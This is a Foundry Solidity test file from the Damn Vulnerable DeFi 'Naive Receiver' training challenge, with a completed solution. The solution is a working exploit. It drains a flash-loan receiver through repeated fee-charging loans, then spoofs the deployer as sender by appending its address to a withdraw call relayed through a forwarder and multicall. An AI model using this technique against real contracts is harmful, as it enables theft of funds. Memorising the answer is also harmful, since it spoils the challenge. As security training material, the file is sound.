// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(bytes4(hex"48f5c3ed"));
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {
        // building multicall:
        // first 10 calls drain 1 eth each as fees from naive flash loan receiver
        // 11th call is staling moneh from pool
        bytes[] memory calls = new bytes[](11);
        
        // first 10: 
        for (uint256 i = 0; i < 10; i++) {
            calls[i] = abi.encodeCall(
                NaiveReceiverPool.flashLoan,
                (receiver, address(weth), 0, "")
            );
        }
        
        // manually append deployer address to this call!
        // this gets delegatecalled: its msg.data will end with deployer address huehuehue
        bytes memory withdrawCall = abi.encodeCall(
            NaiveReceiverPool.withdraw,
            (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))
        );
        calls[10] = abi.encodePacked(withdrawCall, deployer);
        
        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player, 
            target: address(pool),
            value: 0,
            gas: 1_000_000,
            nonce: 0,
            data: abi.encodeCall(Multicall.multicall, (calls)),
            deadline: block.timestamp
        });
        
        // Sign as player
        bytes32 digest = keccak256(abi.encodePacked(
            "\x19\x01",
            forwarder.domainSeparator(),
            forwarder.getDataHash(request)
        ));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
        bytes memory signature = abi.encodePacked(r, s, v);
        
        // forwarder will append 'player' to outer call,
        // but the withdraw delegatecall has 'deployer' in ITS msg.data huehuehuehue
        forwarder.execute(request, signature);
        assertEq(weth.balanceOf(address(recovery)), WETH_IN_POOL + WETH_IN_RECEIVER);
        assertEq(weth.balanceOf(address(player)), 0);
        assertEq(weth.balanceOf(address(pool)), 0);
        assertEq(weth.balanceOf(address(receiver)), 0);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}
